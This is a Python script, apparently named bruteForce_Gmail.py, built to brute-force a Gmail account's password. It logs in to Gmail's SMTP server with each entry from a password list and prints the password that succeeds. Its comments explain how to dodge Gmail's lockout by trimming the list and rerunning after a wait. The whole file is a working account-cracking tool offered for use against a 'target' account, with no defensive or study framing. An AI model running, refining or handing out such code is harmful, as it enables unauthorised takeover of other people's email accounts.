import smtplib
import os
import time
# from goto import goto, label

target = "" # target gmail
passlist = "" # path to your password list

class Crack():
    def __init__(self, gmail, file):
        self.gmail = gmail
        self.file = file
        self.list = []
        self.server = None

    def openFile(self):
        if os.path.exists(self.file):  # Fixed file existence check
            with open(self.file, "r", encoding="utf-8") as file_open:
                self.list = file_open.readlines() # Read file properly
            self.connect(False)
        else:
            print("Password list does not exist.")
            return

    def connect(self, resume):
        attempts = 0
        while attempts < 5:  # Avoid infinite loop
            try:
                self.server = smtplib.SMTP_SSL('smtp.gmail.com', 465)  # Corrected port
                self.server.ehlo()
                break
            except Exception as e:
                print(f"Connection failed: {e}")
                time.sleep(1)
                attempts += 1
        if attempts == 5:
            print("Failed to connect after multiple attempts.")
            return
        if not resume:
            self.login()

    def login(self):
        
        i = 0
        for pswd in self.list:
            pswd = pswd.strip() # Removes newlines and spaces
            i += 1
            while True:
                try:
                    print(f"Attempt {i}: Trying password {pswd}")
                    self.server.login(self.gmail, pswd)
                    print(f"Success! Account password is: {pswd}")
                    return  # Stop after finding the correct password
                except smtplib.SMTPAuthenticationError as e:
                    error = str(e)
                    if "Application-specific password required" in error:
                        print(f"Account password is: {pswd} (app-specific password required)")
                        return
                    elif "Username and Password not accepted" in error:
                        print(f"Incorrect password: {pswd}")
                        break  # Try next password
                    else:
                        print(f"Error: {e}")
                        self.connect(True)
                        continue
                except smtplib.SMTPServerDisconnected:
                    print(f"Server disconnected after trying too many attempts. \nNow delete your the password in your password list from the top to {pswd} then save and wait for 4-5 minutes then run bruteForce_Gmail.py again.")
                    return


                    

if __name__ == "__main__":
    crack = Crack(target, passlist)
    crack.openFile()
